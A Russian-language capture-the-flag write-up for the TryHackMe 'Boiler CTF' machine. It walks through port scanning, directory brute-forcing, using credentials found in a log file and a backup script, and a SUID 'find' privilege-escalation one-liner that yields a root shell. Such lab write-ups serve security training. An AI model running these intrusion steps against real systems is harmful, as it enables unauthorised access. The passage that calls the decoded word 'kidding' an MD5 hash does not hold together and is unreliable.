# Отчет по прохождению машины Boiler CTF TryHackMe

## Введение

В данном отчете описан процесс взлома машины Boiler CTF с платформы TryHackMe. Целью было получение флагов пользователя и root-доступа к системе.

---

## Этап 1: Разведка (Reconnaissance)

### Сканирование портов

Для начала была выполнена полная проверка открытых портов с помощью утилиты **nmap**:

```bash
nmap -sC -sV -p- <IP-адрес>
```

**Результаты сканирования:**

| Порт | Протокол | Сервис | Примечание |
|------|----------|--------|------------|
| 21 | TCP | FTP | Открыт |
| 80 | TCP | HTTP | Веб-сервер |
| 10000 | TCP | MiniServ | Веб-интерфейс управления |
| 55007 | TCP | SSH | SSH на нестандартном порту |

---

## Этап 2: Исследование веб-сервисов

### Веб-интерфейс (порт 80)

При исследовании главной страницы веб-сайта не было обнаружено ничего полезного.

### FTP (порт 21)

Попытка подключения под анонимным пользователем:

```bash
ftp <IP-адрес>
# логин: anonymous
# пароль: (пусто)
```

В FTP-директории также не нашлось интересных файлов.

### robots.txt

В файле `robots.txt` были обнаружены десятичные ASCII-коды:

```
# Пример найденных данных:
# 107 105 100 100 105 110 103
```

**Декодирование:**

```bash
# Перевод десятичного кода в ASCII:
# 107=k, 105=i, 100=d, 100=d, 105=i, 110=n, 103=g
# Получаем: kidding
```

Это оказался MD5-хеш, который был расшифрован на **crackstation.net**:

```
kidding → MD5: [хеш]
```

Ответ на вопрос о возможности эксплуатации MiniServ (порт 10000) оказался отрицательным, поэтому дальнейшее исследование этого сервиса было прекращено.

---

## Этап 3: Перебор директорий

### Gobuster

Запуск инструмента **Gobuster** с использованием словаря `big.txt`:

```bash
gobuster dir -u http://<IP-адрес> -w /usr/share/wordlists/dirbuster/big.txt
```

**Найденные директории:**

- `/joomla` — CMS Joomla
- `/joomla/_test` — тестовая директория
- Другие директории, в том числе шуточные от автора (не содержали полезной информации)

**Детальное исследование:**  
Все найденные директории были тщательно проверены.

### Находка в директории _test

Внутри `/joomla/_test` был обнаружен файл, указывающий на приложение **sar2html** с функцией загрузки файлов.

Попытки загрузить reverse shell:
- Различные расширения файлов не дали результата
- Система отклоняла все попытки

Продолжая перебор поддиректорий sar2html, был найден файл **log.txt**.

### log.txt — учетные данные

Внутри log.txt находились учетные данные:

```
username: basterd
password: supersuperp@$$
```

## Этап 4: Получение доступа по SSH

Подключение по SSH на нестандартный порт:

```bash
ssh basterd@<IP-адрес> -p 55007
# Пароль: supersuperp@$$
```

## Этап 5: Повышение привилегий (User → stoner)

### Обнаружение backup.sh

В домашней директории пользователя `basterd` находился скрипт:

```bash
cat backup.sh
```

Внутри скрипта были обнаружены учетные данные другого пользователя:

```
username: stoner
password: [пароль]
```

**Подключение под пользователем stoner:**

```bash
su stoner
# вводим пароль
```

### Получение первого флага (user.txt)

Поиск файла `user.txt` не дал результатов при использовании стандартных команд.  
Выполнение команды для отображения скрытых файлов:

```bash
ls -la
```

В домашней директории пользователя `stoner` был найден скрытый файл:

```
.secret
```

**Содержимое:** первый флаг (user flag).

---

## Этап 6: Повышение привилегий (stoner → root)

### Поиск SUID-файлов

```bash
find / -perm -4000 2>/dev/null
```

В выводе обнаружилась утилита **find** с установленным SUID-битом.

### Эксплуатация через GTFOBins

По информации с **GTFOBins**, утилита `find` может использоваться для получения шелла:

```bash
find . -exec /bin/sh \; -quit
```

Однако эта команда открывала обычный шелл без root-прав.

**Модификация команды** для сохранения привилегий:

```bash
find . -exec /bin/bash -p \; -quit
```

**Результат:** получен root-доступ!

---

## Этап 7: Получение root-флага

Переход в директорию root:

```bash
cd /root
cat root.txt
```

Второй (root) флаг успешно получен.
